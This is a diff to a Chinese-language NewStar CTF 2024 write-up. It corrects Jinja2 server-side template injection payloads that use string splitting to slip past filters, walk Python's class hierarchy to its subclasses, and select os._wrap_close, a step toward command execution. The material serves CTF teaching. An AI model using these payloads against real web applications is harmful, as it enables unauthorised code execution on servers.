@@ -24,7 +24,7 @@ titleTemplate: ':title | WriteUp - NewStar CTF 2024'
 
 ```python
 {{()['__cl'+'ass__']['__base__']}}
-{{()['__cl'+'ass__']['__base__']['__subcl'+'asses__']}}
+{{()['__cl'+'ass__']['__base__']['__subcl'+'asses__']()}}
 ```
 
 ![获取 object 类](/assets/images/wp/2024/week2/fuduji_2.png)
@@ -32,7 +32,7 @@ titleTemplate: ':title | WriteUp - NewStar CTF 2024'
 找一个可以利用的类，这里选用 `os._wrap_close`
 
 ```python
-{{()['__cl'+'ass__']['__base__']['__subcl'+'asses__'][132]}}
+{{()['__cl'+'ass__']['__base__']['__subcl'+'asses__']()[132]}}
 ```
 
 ![获取 os._wrap_close](/assets/images/wp/2024/week2/fuduji_3.png)
